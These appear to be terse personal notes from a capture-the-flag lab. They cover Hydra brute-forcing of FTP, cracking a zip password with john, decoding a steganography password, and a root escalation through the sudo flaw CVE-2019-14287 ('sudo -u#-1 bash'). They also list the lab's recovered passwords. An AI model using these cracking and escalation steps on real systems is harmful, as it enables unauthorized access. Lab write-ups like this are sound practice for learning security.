## Things to learn
- Learn FTP

## Enumeration

## User agent switcher 
Can spoof with curl

## Brute force FTP with Hydra
FTP password: crystal

## File stuff
`file`
`exiftool`
`binwalk`
`7z e file.zip`

## Brute force zip file
`zip2john file.zip > hash.txt`
`john hash.txt`
Zip Password: alien
Steg encrypted: QXJlYTUx

## Brute force steg | USED WRITEUP
encrypted password, use cyberchef
Steg password: Area51
Agent J password: hackerrules!

## privesc | USED WRITEUP
`sudo -l` shows we can run bash as any user except root
use this [cve](https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability)
`sudo -u#-1 bash`
